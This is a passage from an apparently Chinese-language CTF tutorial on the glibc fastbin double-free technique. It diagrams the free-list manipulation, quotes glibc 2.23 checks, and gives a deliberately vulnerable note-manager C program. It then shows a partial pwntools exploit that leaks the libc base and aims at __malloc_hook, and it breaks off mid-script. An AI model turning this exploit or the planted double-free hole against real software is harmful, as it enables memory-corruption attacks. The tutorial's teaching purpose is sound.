<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin-&gt;chunk2-&gt;chunk1-&gt;NULL</span><br><span class="line"></span><br><span class="line">chunk 1(free)</span><br><span class="line">chunk 2(free)</span><br></pre></td></tr></table></figure>

<p>再來再free一次chunk 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin-&gt;chunk1-&gt;chunk2-&gt;chunk1-&gt;chunk2-&gt;...</span><br><span class="line"></span><br><span class="line">chunk 1(double free)</span><br><span class="line">chunk 2(free)</span><br></pre></td></tr></table></figure>

<p>這時候malloc<br>會拿到chunk 1(然後fastbin退鏈改指chunk 2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fastbin-&gt;chunk2-&gt;chunk1-&gt;chunk2-&gt;...</span><br><span class="line">          ^</span><br><span class="line">chunk1 ___|</span><br><span class="line"></span><br><span class="line">chunk 1(double free &amp; allocate)</span><br><span class="line">chunk 2(free)</span><br></pre></td></tr></table></figure>

<p>這時候對當前malloc到的那塊寫入fd，到一個的pwn_address</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin-&gt;chunk2-&gt;chunk1-&gt;pwn_address-&gt;??</span><br><span class="line"></span><br><span class="line">chunk 1(double free &amp; allocate)</span><br><span class="line">chunk 2(free)</span><br></pre></td></tr></table></figure>

<p>再來malloc拿到 chunk 2，fastbin退鏈(隨便寫啥都行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin-&gt;chunk1-&gt;pwn_address-&gt;??</span><br><span class="line"></span><br><span class="line">chunk 1(double free &amp; allocate)</span><br><span class="line">chunk 2(allocate)</span><br></pre></td></tr></table></figure>

<p>再malloc拿到chunk 1，fastbin退鏈指到惡意address(隨便寫啥都行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin-&gt;pwn_address-&gt;??</span><br><span class="line"></span><br><span class="line">chunk 1(double free &amp; allocate)</span><br><span class="line">chunk 2(allocate)</span><br></pre></td></tr></table></figure>
<p>再malloc拿到pwn_address，達成任意寫，fastbin-&gt;???(這裡須注意，在glibc 2.26以前，fd指向header，但開始寫會從user data，所以選擇address時要往前指0x10左右)</p>
<p>然後注意，你指向的位置的chunk size需要符合該fastbin 所屬size</p>
<h3 id="安全機制"><a href="#安全機制" class="headerlink" title="安全機制"></a>安全機制</h3><h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>你free的下一塊鄰近chunk size是否正確</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">		     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">	  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">	  locked = <span class="number">1</span>;</span><br><span class="line">	  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h4 id="second"><a href="#second" class="headerlink" title="second"></a>second</h4><p>若fastbin上的第一個free chunk，又被做了一次free chunk，就會偵測到然後crash</p>
<p>所以為甚麼前面是free 1-&gt;free2-&gt;free1<br>這樣fastbin上第一個free chunk就是free2，來bypass</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3929">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3929</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">   mchunkptr old = *fb, old2;</span><br><span class="line">   <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="third"><a href="#third" class="headerlink" title="third"></a>third</h4><p>malloc 時候檢查拿到的chunk是否跟fastbin一樣</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      do</span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == NULL)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> NULL;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, <span class="built_in">bytes</span>);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="fourth"><a href="#fourth" class="headerlink" title="fourth"></a>fourth</h4><p>2.27加入tcache機制，但這版本拔掉了原本的檢查double free(鍊上第一個是否是現在free的)，且尚未加入key之類的機制，利用起來比2.23簡單</p>
<h3 id="demo-3"><a href="#demo-3" class="headerlink" title="demo"></a>demo</h3><h4 id="source-code-2"><a href="#source-code-2" class="headerlink" title="source code"></a>source code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Testing in libc-2.23</span></span><br><span class="line"><span class="comment">// gcc fastbin_dup.c -o fastbin_dup</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_ptrs[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_used[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_num</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v0.87 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">    g_ptrs[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    g_size[idx] = size;</span><br><span class="line">    g_used[idx] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create: g_ptrs[%d]\n&quot;</span>, idx);</span><br><span class="line"></span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_used[idx]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;g_ptrs[%d]: %s\n&quot;</span>, idx, g_ptrs[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_used[idx]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;str:\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, g_ptrs[idx], g_size[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (g_ptrs[idx]) &#123;</span><br><span class="line">        <span class="built_in">free</span>(g_ptrs[idx]);</span><br><span class="line">        g_used[idx] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">switch</span>(read_num()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            create();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            get();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">set</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            delete();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>可以輸入1~5，分別對應</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v0.87 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>create() -&gt; 1</p>
</blockquote>
<p>malloc一個chunk，並可以指定一個size</p>
<p>並且把東西存到這三個global variable</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *g_ptrs[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_used[<span class="number">0x20</span>];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>get() -&gt; 2</p>
</blockquote>
<p>先確認該chunk存不存在，以及是否是allocated，你可以指定index，然後給你他的內容</p>
<blockquote>
<p>set() -&gt; 3</p>
</blockquote>
<p>先確認該chunk存不存在，以及是否是allocated<br>指定index，並可以把內容寫進去chunk裡面</p>
<blockquote>
<p>delete -&gt; 4</p>
</blockquote>
<p>輸入一個index，若該ptrs存在，則把它free掉，然後把used改成0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (g_ptrs[idx]) &#123;</span><br><span class="line">    <span class="built_in">free</span>(g_ptrs[idx]);</span><br><span class="line">    g_used[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>觀察一下這裡，他是去找g_ptrs裡面有沒有然後再free掉，但很顯然的g_ptrs就算你free掉了，也不會把它清掉所以就可以double free</p>
<p>並且打這題目前要有一個先備知識，要怎麼leak libc，我們打算透過fastbin dup來改malloc_hook，那就必須要有libc base，這邊可以用unsorted bin來leak，因為當unsorted bin被free掉時候，fd、bk會指向一個libc address</p>
<p>像是這樣，我先malloc一個<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJX_vpOv0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJX_vpOv0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>然後free，就可以發現有了<br><div class="img-item" data-src="https://hackmd.io/_uploads/rk_6Pp_PR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rk_6Pp_PR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>接下來我透過在malloc一次一樣大小的來拿到同一塊，並且fd、bk沒有被清空，用get，就可以把它印出來了</p>
<p>拿offset<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkhSB0uPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkhSB0uPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x72db424aab78-0x72db420e6000</span><br><span class="line">3951480</span><br><span class="line">&gt;&gt;&gt; hex(3951480)</span><br><span class="line">&#x27;0x3c4b78&#x27;</span><br></pre></td></tr></table></figure>

<p>目前這樣可以leak libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : 